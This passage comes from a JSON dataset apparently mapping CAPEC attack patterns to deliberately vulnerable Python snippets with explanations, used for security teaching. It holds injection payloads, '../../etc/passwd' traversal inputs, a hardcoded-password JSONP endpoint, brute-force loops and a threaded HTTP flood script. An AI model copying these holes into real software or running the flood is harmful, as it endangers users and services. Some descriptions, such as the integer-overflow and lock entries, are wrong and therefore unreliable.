        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates a clickjacking vulnerability. The main page ('/') includes an invisible iframe that loads content from the '/malicious' route. The iframe is styled to be transparent and positioned over the main content, tricking users into interacting with the hidden malicious content. This embodies the main idea of CAPEC-111 (Clickjacking) by showing how an adversary can trick a user into interacting with a different UI layer. The code also touches on CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not restricting the iframe content, allowing the clickjacking attack to occur."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "import webbrowser\n\n# CWE-250: Execution with Unnecessary Privileges\n# Running the web browser with elevated privileges\nwebbrowser.open('http://example.com/malicious_content.html')\n\n# CWE-116: Improper Encoding or Escaping of Output\n# The URL is not properly encoded, allowing for potential injection\nmalicious_url = 'http://example.com/malicious_content.html?param=<script>alert(1)</script>'\nwebbrowser.open(malicious_url)\n\n# CWE-285: Improper Authorization\n# No authorization check before opening the URL\nuser_privilege_level = 'admin'  # Assume the user is an admin\nif user_privilege_level == 'admin':\n    webbrowser.open(malicious_url)\n\n# CWE-20: Improper Input Validation\n# No validation on the URL input\nuser_input_url = input('Enter a URL to open: ')\nwebbrowser.open(user_input_url)\n\n# CWE-638: Not Using Complete Mediation\n# No re-checking of privileges before performing the action\nif user_privilege_level == 'admin':\n    webbrowser.open(malicious_url)\n",
        "description": "This Python code snippet demonstrates a scenario where a web browser is opened with elevated privileges, potentially leading to a Cross Zone Scripting attack. The code includes several vulnerabilities: \n1. CWE-250: The web browser is opened with unnecessary elevated privileges.\n2. CWE-116: The URL is not properly encoded, allowing for potential script injection.\n3. CWE-285: There is no proper authorization check before opening the URL.\n4. CWE-20: The URL input from the user is not validated.\n5. CWE-638: There is no re-checking of user privileges before performing the action. \nThese vulnerabilities can be exploited by an attacker to execute malicious scripts or load harmful content, bypassing security zone controls and gaining elevated privileges in the victim's web browser."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport urllib.parse\n\nclass VulnerableHTTPRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        # Extract query parameters\n        query = urllib.parse.urlparse(self.path).query\n        params = urllib.parse.parse_qs(query)\n        \n        # Vulnerable to HTTP Request Splitting\n        if 'input' in params:\n            user_input = params['input'][0]\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.send_header('X-User-Input', user_input)  # Improper Neutralization of CRLF Sequences\n            self.end_headers()\n            self.wfile.write(b'Hello, World!')\n        else:\n            self.send_response(400)\n            self.end_headers()\n\nif __name__ == '__main__':\n    server = HTTPServer(('localhost', 8080), VulnerableHTTPRequestHandler)\n    print('Starting server at http://localhost:8080')\n    server.serve_forever()",
        "description": "This Python code snippet demonstrates a simple HTTP server that is vulnerable to HTTP Request Splitting. The server extracts query parameters from the URL and includes user input directly in the HTTP headers without proper neutralization of CRLF sequences. This can allow an attacker to inject malicious headers or split the HTTP request into multiple requests, leading to potential security issues such as HTTP Request Smuggling. The code highlights the importance of properly sanitizing and neutralizing user input to prevent such vulnerabilities."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "import logging\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    logging.info(f'User input: {user_input}')\n    return render_template_string(f'<p>{user_input}</p>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross-Site Scripting (XSS) through log files. The application accepts user input via a POST request to the '/submit' endpoint. The user input is logged using Python's logging module and then rendered directly in an HTML template without proper sanitization. This embodies the main idea of the deprecated CAPEC 'XSS through Log Files' by showing how user input can be logged and then rendered in a web page, potentially leading to XSS attacks. The related CWEs highlight the issues of incomplete denylist-based protection (CWE-692), improper neutralization of input (CWE-79), and improper handling of script in HTML attributes (CWE-82)."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/trace', methods=['TRACE'])\ndef trace_method():\n    # CWE-693: Protection Mechanism Failure\n    # CWE-648: Incorrect Use of Privileged APIs\n    # CWE-79: Improper Neutralization of Input During Web Page Generation\n    # CWE-352: Cross-Site Request Forgery (CSRF)\n    # CWE-692: Incomplete Denylist to Cross-Site Scripting\n    response = make_response(request.data)\n    response.headers['Content-Type'] = 'message/http'\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that includes a route for handling HTTP TRACE requests. The TRACE method is inherently vulnerable to Cross Site Tracing (XST) attacks, as it echoes back the entire request, including sensitive headers like cookies. This can be exploited by an attacker to steal session cookies and other authentication credentials. The code demonstrates several related weaknesses: it fails to implement proper protection mechanisms (CWE-693), uses privileged APIs incorrectly (CWE-648), does not neutralize user input (CWE-79), lacks CSRF protection (CWE-352), and does not have a complete denylist for XSS (CWE-692)."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "import sqlite3\nimport os\n\n# Simulate user input\nuser_input = \"1; DROP TABLE users; --\"\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# Vulnerable SQL query\nquery = f\"SELECT * FROM users WHERE id = {user_input}\"\ncursor.execute(query)\n\n# Fetch the result\nresult = cursor.fetchone()\n\n# Simulate fetching data from the database and using it in an OS command\nif result:\n    user_data = result[0]\n    os.system(f\"echo {user_data}\")\n\nconn.close()",
        "description": "This Python code snippet demonstrates a vulnerability where user input is directly used in an SQL query without proper sanitization, leading to SQL Injection (CWE-89). The injected SQL command can manipulate the database, such as dropping a table. Additionally, the fetched data from the database is used directly in an OS command without validation, leading to OS Command Injection (CWE-78). This embodies the main idea of the CAPEC, where an attacker can inject malicious data into the database and later exploit it to execute arbitrary commands on the host system."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "from sqlalchemy import create_engine, text\n\n# Create a database engine\nengine = create_engine('sqlite:///example.db')\n\n# User input\nuser_input = \"1 OR 1=1\"\n\n# Vulnerable code: Directly using user input in a dynamic SQL query\nwith engine.connect() as connection:\n    result = connection.execute(text(f\"SELECT * FROM users WHERE id = {user_input}\"))\n    for row in result:\n        print(row)",
        "description": "This Python code snippet demonstrates a vulnerability related to Object Relational Mapping (ORM) Injection using SQLAlchemy, a popular ORM tool. The code creates a database engine and executes a dynamic SQL query using user input without proper validation or neutralization. The user input is directly embedded into the SQL query, making it susceptible to SQL injection attacks. In this example, an attacker can manipulate the 'user_input' variable to alter the SQL query's logic, potentially gaining unauthorized access to the database. This snippet embodies the main idea of CAPEC-20, CAPEC-89, CAPEC-564, CAPEC-943, and CAPEC-1083 by highlighting improper input validation and the risks of using dynamic SQL queries with user-controlled input in ORM frameworks."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport sqlite3\n\n# Sample SOAP message with user input\nsoap_message = '''\n<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\">\n  <soap:Body>\n    <GetUserInfo>\n      <UserId>1 OR 1=1</UserId>\n    </GetUserInfo>\n  </soap:Body>\n</soap:Envelope>\n'''\n\n# Parse the SOAP message\nroot = ET.fromstring(soap_message)\nuser_id = root.find('.//UserId').text\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# Vulnerable SQL query construction\nquery = f\"SELECT * FROM users WHERE id = {user_id}\"\n\n# Execute the query\ntry:\n    cursor.execute(query)\n    result = cursor.fetchall()\n    print(result)\nexcept sqlite3.Error as e:\n    print(f\"An error occurred: {e}\")\n\n# Close the connection\nconn.close()",
        "description": "This Python code snippet demonstrates a SQL Injection vulnerability through SOAP parameter tampering. The SOAP message contains a user input field 'UserId' which is extracted and directly used in an SQL query without proper validation or parameter binding. This allows an attacker to manipulate the 'UserId' parameter to alter the SQL query's structure, potentially gaining unauthorized access to the database. The code also highlights the CWE-89 (SQL Injection) and CWE-20 (Improper Input Validation) weaknesses by showing how improper handling of user input can lead to security vulnerabilities."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "from flask import Flask, request, jsonify\nimport json\n\napp = Flask(__name__)\n\n@app.route('/data', methods=['GET'])\ndef get_data():\n    # Simulated sensitive data\n    data = {'user': 'admin', 'password': 'secret'}\n    callback = request.args.get('callback')\n    if callback:\n        # Vulnerable to JSON Hijacking\n        response = f'{callback}({json.dumps(data)})'\n        return app.response_class(response, mimetype='application/javascript')\n    return jsonify(data)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that serves JSON data. The '/data' endpoint returns sensitive data in JSON format. If a 'callback' parameter is provided in the request, the server wraps the JSON data in a JavaScript function call, making it vulnerable to JSON Hijacking. This vulnerability arises because the server does not verify the origin of the request (CWE-346) and improperly handles user input (CWE-79). An attacker can exploit this by including the endpoint in a script tag on a malicious site, thereby stealing the sensitive data. The code demonstrates the main idea of JSON Hijacking by showing how an attacker can exploit the lack of proper data origin verification and input neutralization."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "import random\nimport string\n\n# Weak password requirements\ndef generate_weak_password():\n    return ''.join(random.choice(string.ascii_lowercase) for _ in range(6))\n\n# Insufficiently random values\ndef generate_insufficiently_random_token():\n    return random.randint(0, 1000)\n\n# Inadequate encryption strength\ndef weak_encrypt(data):\n    return ''.join(chr(ord(char) + 1) for char in data)\n\n# Weak authentication mechanism\nusers = {'user1': 'password123'}\n\ndef authenticate(username, password):\n    if username in users and users[username] == password:\n        return True\n    return False\n\n# Improper restriction of excessive authentication attempts\nattempts = {}\n\nfor i in range(1000):  # Simulating brute force attack\n    username = 'user1'\n    password = generate_weak_password()\n    if username not in attempts:\n        attempts[username] = 0\n    attempts[username] += 1\n    if authenticate(username, password):\n        print('Access granted')\n        break\n    if attempts[username] > 100:  # No proper restriction\n        print('Too many attempts')\n        break",
        "description": "This Python code snippet demonstrates several vulnerabilities that can be exploited in a brute force attack. The `generate_weak_password` function creates weak passwords with only lowercase letters and a length of 6 characters, making them easy to guess. The `generate_insufficiently_random_token` function generates tokens with a very limited range, making them predictable. The `weak_encrypt` function uses a simple and inadequate encryption method that can be easily broken. The `authenticate` function checks user credentials against a dictionary of users, but the password requirements are weak. The loop simulates a brute force attack by repeatedly attempting to authenticate with different weak passwords, and the code does not properly restrict the number of authentication attempts, making it vulnerable to brute force attacks."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "import ctypes\n\n# Simulate memory-mapped I/O register access\nclass MemoryMappedIO:\n    def __init__(self, address):\n        self.address = address\n        self.value = 0\n\n    def read(self):\n        return self.value\n\n    def write(self, value):\n        self.value = value\n\n# Simulate improper access control to memory-mapped I/O registers\nclass Device:\n    def __init__(self):\n        self.registers = {\n            'CONTROL': MemoryMappedIO(0x1000),\n            'STATUS': MemoryMappedIO(0x1004)\n        }\n\n    def read_register(self, name):\n        if name in self.registers:\n            return self.registers[name].read()\n        else:\n            raise ValueError('Invalid register name')\n\n    def write_register(self, name, value):\n        if name in self.registers:\n            self.registers[name].write(value)\n        else:\n            raise ValueError('Invalid register name')\n\n# Simulate an attacker manipulating the interface\ndevice = Device()\n\n# Attacker writes to CONTROL register without proper access control\nprint('Before manipulation:', device.read_register('CONTROL'))\ndevice.write_register('CONTROL', 0xDEADBEEF)\nprint('After manipulation:', device.read_register('CONTROL'))\n\n# Attacker reads STATUS register without proper access control\nprint('STATUS register:', device.read_register('STATUS'))",
        "description": "This Python code snippet simulates a scenario where an attacker manipulates a memory-mapped I/O register interface, embodying the main idea of CAPEC-Interface Manipulation. The `MemoryMappedIO` class represents a memory-mapped I/O register, and the `Device` class simulates a device with two registers: 'CONTROL' and 'STATUS'. The `Device` class lacks proper access control mechanisms for these registers, allowing an attacker to read from and write to them without restriction. This demonstrates CWE-1262 (Improper Access Control for Register Interface) and CWE-1299 (Missing Protection Mechanism for Alternate Hardware Interface). The attacker writes a value to the 'CONTROL' register and reads from the 'STATUS' register, showcasing how improper access control can lead to unintended manipulation of the device's functionality."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "import hashlib\n\n# Weak authentication mechanism\nusers = {'admin': '5f4dcc3b5aa765d61d8327deb882cf99'}  # Password is 'password' hashed with MD5\n\n# Function to authenticate user\ndef authenticate(username, password):\n    hashed_password = hashlib.md5(password.encode()).hexdigest()\n    if username in users and users[username] == hashed_password:\n        return True\n    return False\n\n# Simulate an authentication attempt\nusername = 'admin'\npassword = 'password'\n\nif authenticate(username, password):\n    print('Access granted')\nelse:\n    print('Access denied')\n\n# Brute force attack simulation\nfor attempt in range(1000):\n    if authenticate('admin', f'password{attempt}'):\n        print(f'Access granted with password: password{attempt}')\n        break",
        "description": "This Python code snippet demonstrates a weak authentication mechanism vulnerable to multiple CWE issues related to Authentication Abuse. The code uses MD5 hashing for passwords, which is considered weak (CWE-1390). The `authenticate` function checks if the provided username and password match the stored credentials, but it does not implement any measures to prevent excessive authentication attempts (CWE-307). The brute force attack simulation at the end of the code shows how an attacker can repeatedly attempt to guess the password without any restriction, highlighting the vulnerability. This snippet embodies the main idea of CAPEC-115: Authentication Abuse, by showing how an attacker can exploit weak authentication and lack of brute force protection to gain unauthorized access."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "import hashlib\n\n# Simulated user database\nusers = {\n    'admin': '5f4dcc3b5aa765d61d8327deb882cf99'  # 'password' hashed with MD5\n}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    if username in users:\n        hashed_password = hashlib.md5(password.encode()).hexdigest()\n        if users[username] == hashed_password:\n            return True\n    return False\n\n# Bypass authentication by directly setting a flag\nis_authenticated = False\n\n# Simulated login attempt\nusername = 'admin'\npassword = 'password'\n\nif authenticate(username, password):\n    is_authenticated = True\nelse:\n    # Bypass authentication by setting the flag directly\n    is_authenticated = True\n\nif is_authenticated:\n    print('Access granted to protected data.')\nelse:\n    print('Access denied.')",
        "description": "This Python code snippet demonstrates an authentication bypass vulnerability. The `authenticate` function checks if the provided username and password match the stored credentials using MD5 hashing. However, even if the authentication fails, the code sets the `is_authenticated` flag to `True`, effectively bypassing the authentication mechanism. This represents the CAPEC 'Authentication Bypass' by allowing access to protected data without proper authentication. The use of MD5 hashing also highlights CWE-287 (Improper Authentication) and CWE-1390 (Weak Authentication) due to the weak and outdated hashing algorithm."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "import os\n\n# CWE-426: Untrusted Search Path\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug\n\n# Simulate sensitive information\nsensitive_info = 'SECRET_KEY=12345'\n\n# Function to simulate debug mode\ndef debug_mode():\n    # CWE-1243: Sensitive information exposed during debug\n    print(f'Debug Info: {sensitive_info}')\n\n# Function to simulate untrusted search path\ndef load_config():\n    # CWE-426: Using an untrusted search path\n    config_path = os.getenv('CONFIG_PATH', './default_config')\n    try:\n        with open(config_path, 'r') as file:\n            config = file.read()\n            print(f'Loaded config: {config}')\n    except FileNotFoundError:\n        print('Config file not found')\n\n# Main function to simulate the attack\nif __name__ == '__main__':\n    # Simulate an attacker setting an environment variable to an untrusted path\n    os.environ['CONFIG_PATH'] = '/tmp/malicious_config'\n    load_config()\n    debug_mode()",
        "description": "This Python code snippet demonstrates a scenario where sensitive information can be exposed to unauthorized actors through untrusted search paths and insufficient protection during debug mode. The `load_config` function uses an environment variable to determine the configuration file path, which can be manipulated by an attacker to point to a malicious file (CWE-426). The `debug_mode` function prints sensitive information during debugging (CWE-1243), exposing it to unauthorized actors (CWE-200). This embodies the CAPEC concept of 'Excavation,' where an adversary probes the target to solicit sensitive information for malicious purposes."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "import socket\n\n# Vulnerable code: Transmitting sensitive information in cleartext\nserver_address = ('localhost', 10000)\n\n# Create a TCP/IP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect the socket to the port where the server is listening\nsock.connect(server_address)\n\ntry:\n    # Send sensitive data in cleartext\n    message = 'username=admin&password=secret'\n    sock.sendall(message.encode('utf-8'))\n\n    # Look for the response\n    data = sock.recv(1024)\n    print('Received:', data.decode('utf-8'))\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates a vulnerable implementation where sensitive information (username and password) is transmitted in cleartext over a network. The code creates a TCP/IP socket, connects to a server, and sends a message containing sensitive data without any encryption. This makes it susceptible to interception attacks (CAPEC-94) where an adversary can sniff the network traffic and capture the sensitive information. The code embodies CWE-319 (Cleartext Transmission of Sensitive Information) as it fails to encrypt the data being transmitted, making it easy for unauthorized actors to intercept and read the content."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "import urllib.parse\n\ndef is_safe_input(user_input):\n    # Incomplete list of disallowed inputs (CWE-184)\n    disallowed = ['<script>', '..', '%2E']\n    for item in disallowed:\n        if item in user_input:\n            return False\n    return True\n\n# Example of improper handling of URL encoding (CWE-177)\nuser_input = '%252E%252E%252Fetc%252Fpasswd'  # Double encoded '../etc/passwd'\n\n# Validate before filter (CWE-181)\nif is_safe_input(user_input):\n    decoded_input = urllib.parse.unquote(user_input)  # Decodes to '%2E%2E/etc/passwd'\n    decoded_input = urllib.parse.unquote(decoded_input)  # Decodes to '../etc/passwd'\n    print(f\"Processed input: {decoded_input}\")\nelse:\n    print(\"Input is not safe\")",
        "description": "This Python code snippet demonstrates the concept of double encoding (CAPEC-170) and related weaknesses. The `is_safe_input` function checks if the user input contains any disallowed substrings, but the list is incomplete (CWE-184). The user input is double encoded to bypass the filter (CWE-177). The code validates the input before decoding it (CWE-181), which allows the double encoded payload to pass through the filter. The `urllib.parse.unquote` function is used to decode the input twice, ultimately revealing the malicious payload ('../etc/passwd'). This example highlights how improper handling of encoding and validation can lead to security vulnerabilities."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "import os\n\nclass ProductionSystem:\n    def __init__(self):\n        self.debug_mode = os.getenv('DEBUG_MODE', 'False') == 'True'\n        self.security_token = self.generate_security_token()\n\n    def generate_security_token(self):\n        if self.debug_mode:\n            # Insecure token generation for debugging purposes\n            return 'DEBUG-TOKEN-1234'\n        else:\n            # Proper token generation for production\n            return 'PROD-TOKEN-5678'\n\n    def debug_info(self):\n        if self.debug_mode:\n            # Exposing sensitive information in debug mode\n            return 'Sensitive debug information'\n        else:\n            return 'No debug information available'\n\n# Simulate a production environment with debug mode enabled\nos.environ['DEBUG_MODE'] = 'True'\n\nsystem = ProductionSystem()\nprint(system.debug_info())\nprint(system.security_token)",
        "description": "This Python code snippet represents a production system that has a debug mode which can be enabled via an environment variable. When the debug mode is enabled, the system generates an insecure security token and exposes sensitive debug information. This embodies the main idea of CAPEC-0022 (Exploit Non-Production Interfaces) by demonstrating how an adversary could exploit a debug interface that is unintentionally enabled in a production environment. The related CWEs are represented by the insecure token generation (CWE-1270), revealing unnecessary debug information (CWE-1295), and the active debug code (CWE-489)."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "class User:\n    def __init__(self, username, role):\n        self.username = username\n        self.role = role\n\nclass Resource:\n    def __init__(self, name, sensitive_data):\n        self.name = name\n        self.sensitive_data = sensitive_data\n\n    def access_resource(self, user):\n        if user.role == 'admin':\n            return self.sensitive_data\n        else:\n            return 'Access Denied'\n\n# Example usage\nadmin_user = User('admin', 'admin')\nregular_user = User('user', 'user')\nresource = Resource('confidential', 'Top Secret Data')\n\n# Admin access\nprint(resource.access_resource(admin_user))  # Expected: 'Top Secret Data'\n\n# Regular user access\nprint(resource.access_resource(regular_user))  # Expected: 'Access Denied', but vulnerable to privilege abuse\n\n# Vulnerability: Improper privilege management\nregular_user.role = 'admin'  # Privilege escalation\nprint(resource.access_resource(regular_user))  # Now returns: 'Top Secret Data'",
        "description": "This Python code snippet demonstrates a simple privilege management system where a `User` class and a `Resource` class are defined. The `Resource` class has a method `access_resource` that checks if the user has an 'admin' role to access sensitive data. However, the code is vulnerable to privilege abuse because it allows the role of a user to be changed directly, leading to improper privilege management (CWE-269) and incorrect permission assignment (CWE-732). This represents the main idea of the CAPEC by showing how an adversary could exploit features meant for privileged users by manipulating user roles."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "def vulnerable_function(input_data):\n    buffer = [0] * 10  # Fixed size buffer\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]  # No bounds checking\n    return buffer\n\n# Example usage\ninput_data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]  # Input larger than buffer\nresult = vulnerable_function(input_data)\nprint(result)",
        "description": "This Python code snippet demonstrates a buffer manipulation vulnerability, specifically a buffer overflow (CWE-119). The function `vulnerable_function` takes `input_data` and attempts to copy its contents into a fixed-size buffer of 10 elements. However, it does not perform any bounds checking, which means if `input_data` is larger than the buffer, it will write beyond the buffer's allocated memory. This can lead to overwriting adjacent memory, potentially causing crashes or allowing an attacker to manipulate the program's behavior. The example usage shows how providing an input larger than the buffer size can trigger this vulnerability."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "import threading\n\n# Shared resource\nshared_counter = 0\n\n# Lock for synchronizing access to the shared resource\nlock = threading.Lock()\n\n# Function that increments the shared counter\ndef increment_counter():\n    global shared_counter\n    for _ in range(1000000):\n        with lock:\n            shared_counter += 1\n\n# Function that decrements the shared counter\ndef decrement_counter():\n    global shared_counter\n    for _ in range(1000000):\n        with lock:\n            shared_counter -= 1\n\n# Create threads\nthread1 = threading.Thread(target=increment_counter)\nthread2 = threading.Thread(target=decrement_counter)\n\n# Start threads\nthread1.start()\nthread2.start()\n\n# Wait for threads to complete\nthread1.join()\nthread2.join()\n\nprint(f'Final counter value: {shared_counter}')",
        "description": "This Python code snippet demonstrates a scenario where multiple threads access and manipulate a shared resource, in this case, a global counter. The shared resource is protected using a lock to ensure proper synchronization (CWE-662). The code creates two threads: one increments the counter, and the other decrements it. The lock ensures that only one thread can modify the counter at a time, preventing race conditions. This example embodies the main idea of CAPEC-24 (Shared Resource Manipulation) by showing how improper synchronization can lead to issues when multiple threads access a shared resource. Proper use of locks helps mitigate these issues."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "import threading\nimport requests\n\n# URL to target\nurl = 'http://example.com'\n\n# Function to perform a large number of requests\ndef flood_target():\n    while True:\n        try:\n            response = requests.get(url)\n            print(f'Status Code: {response.status_code}')\n        except requests.exceptions.RequestException as e:\n            print(f'Request failed: {e}')\n\n# Create multiple threads to simulate a flood attack\nthreads = []\nfor i in range(100):  # Adjust the number of threads as needed\n    thread = threading.Thread(target=flood_target)\n    thread.start()\n    threads.append(thread)\n\n# Join threads to ensure they run indefinitely\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a simple flooding attack on a target URL. The code creates multiple threads, each of which continuously sends HTTP GET requests to the specified URL. This simulates a high volume of interactions with the target, aiming to consume its resources and potentially cause a denial of service for legitimate users. The code embodies the main idea of the CAPEC 'Flooding' attack by rapidly engaging in a large number of interactions with the target. The related CWEs are represented by the lack of rate limiting (CWE-770), potential for resource exhaustion (CWE-400), and insufficient control of network message volume (CWE-406)."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "import os\n\ndef read_file(filename):\n    base_directory = '/var/www/data/'\n    file_path = os.path.join(base_directory, filename)\n    \n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found.'\n\n# Example usage\nuser_input = '../../etc/passwd'\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a path traversal vulnerability. The function `read_file` takes a filename as input and constructs a file path by joining a base directory (`/var/www/data/`) with the provided filename. However, it does not properly validate or sanitize the input, allowing an attacker to use sequences like `../../` to traverse directories and access files outside the intended directory. In the example usage, the user input `../../etc/passwd` attempts to read the system's password file, which should be restricted. This code embodies the main idea of the CAPEC by showing how insufficient input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\n\n@app.route('/files/<path:filename>', methods=['GET'])\ndef serve_file(filename):\n    # CWE-276: Incorrect Default Permissions\n    # CWE-732: Incorrect Permission Assignment for Critical Resource\n    directory = '/var/www/files'\n    return send_from_directory(directory, filename)\n\n@app.route('/list', methods=['GET'])\ndef list_directory():\n    # CWE-424: Improper Protection of Alternate Path\n    # CWE-425: Direct Request ('Forced Browsing')\n    # CWE-285: Improper Authorization\n    directory = '/var/www/files'\n    files = os.listdir(directory)\n    return '<br>'.join(files)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that serves files from a directory and lists the contents of that directory. The `serve_file` function allows users to request specific files from the '/var/www/files' directory, while the `list_directory` function lists all files in that directory. The code embodies the main idea of the CAPEC by potentially exposing directory contents and file names to unauthorized users. The related CWEs are represented as follows: CWE-276 and CWE-732 are demonstrated by the lack of proper permission checks when serving files, CWE-424 and CWE-425 are shown by the ability to list directory contents without proper protection, and CWE-285 is illustrated by the lack of authorization checks for accessing these resources."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "def calculate_total(items):\n    total = 0\n    for item in items:\n        total += item['quantity'] * item['price']\n    return total\n\nitems = [\n    {'quantity': 2147483647, 'price': 2},  # Large quantity to cause overflow\n    {'quantity': 1, 'price': 10}\n]\n\nprint(calculate_total(items))",
        "description": "This Python code snippet demonstrates an integer overflow vulnerability. The `calculate_total` function calculates the total price of items by multiplying the quantity and price of each item and summing them up. The `items` list contains a large quantity value (2147483647) that, when multiplied by the price (2), causes an integer overflow. This overflow can lead to incorrect calculations and potentially unexpected behavior in the application. This example embodies the main idea of CAPEC 'Integer Attacks' and highlights CWE-190 (Integer Overflow or Wraparound) and CWE-682 (Incorrect Calculation)."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "import ctypes\n\n# Simulate untrusted input\nuntrusted_input = -1\n\n# Convert untrusted input to a pointer\nptr = ctypes.c_void_p(untrusted_input)\n\n# Dereference the pointer\ntry:\n    value = ctypes.cast(ptr, ctypes.POINTER(ctypes.c_int)).contents.value\n    print(f'Dereferenced value: {value}')\nexcept ValueError as e:\n    print(f'Error: {e}')\nexcept Exception as e:\n    print(f'Unexpected error: {e}')",
        "description": "This Python code snippet demonstrates a pointer manipulation vulnerability by converting an untrusted input to a pointer and then attempting to dereference it. The untrusted input is set to -1, which is an invalid memory address. The code uses the ctypes library to handle the pointer operations. When the pointer is dereferenced, it will likely cause an error or crash, representing CWE-822 (Untrusted Pointer Dereference) and CWE-476 (NULL Pointer Dereference). This snippet embodies the main idea of the CAPEC by showing how manipulating a pointer with untrusted input can lead to accessing unintended memory locations, potentially causing crashes or other unintended behavior."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "import os\n\nclass ResourceAllocator:\n    def __init__(self):\n        self.resources = []\n\n    def allocate_resource(self, size):\n        # CWE-770: No limit on resource allocation\n        resource = 'A' * size\n        self.resources.append(resource)\n        print(f'Allocated resource of size: {size}')\n\n    def release_resources(self):\n        # CWE-404: Improper resource release\n        self.resources = []\n        print('Released all resources')\n\n# CWE-400: Uncontrolled resource consumption\nallocator = ResourceAllocator()\n\n# Simulate an excessive allocation attack\ntry:\n    allocator.allocate_resource(10**9)  # Allocate 1GB of memory\nexcept MemoryError:\n    print('Memory allocation failed')\n\n# Release resources\nallocator.release_resources()",
        "description": "This Python code snippet demonstrates an excessive allocation attack by allocating a large amount of memory (1GB) in a single request. The `ResourceAllocator` class has methods to allocate and release resources. The `allocate_resource` method does not impose any limits on the size of the resource being allocated (CWE-770), leading to potential uncontrolled resource consumption (CWE-400). The `release_resources` method improperly releases resources by simply clearing the list (CWE-404). This code represents the main idea of the CAPEC by showing how an attacker can cause excessive resource allocation with a single request, potentially leading to resource exhaustion and denial of service."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "import threading\n\nclass Resource:\n    def __init__(self):\n        self.lock = threading.Lock()\n        self.resource = []\n\n    def add_data(self, data):\n        self.lock.acquire()\n        try:\n            self.resource.append(data)\n        finally:\n            # Improper release of resource\n            pass\n\n    def get_data(self):\n        self.lock.acquire()\n        try:\n            if self.resource:\n                return self.resource.pop(0)\n            else:\n                return None\n        finally:\n            self.lock.release()\n\nresource = Resource()\n\n# Simulate resource usage\nfor i in range(100):\n    threading.Thread(target=resource.add_data, args=(i,)).start()\n\nfor i in range(100):\n    threading.Thread(target=resource.get_data).start()",
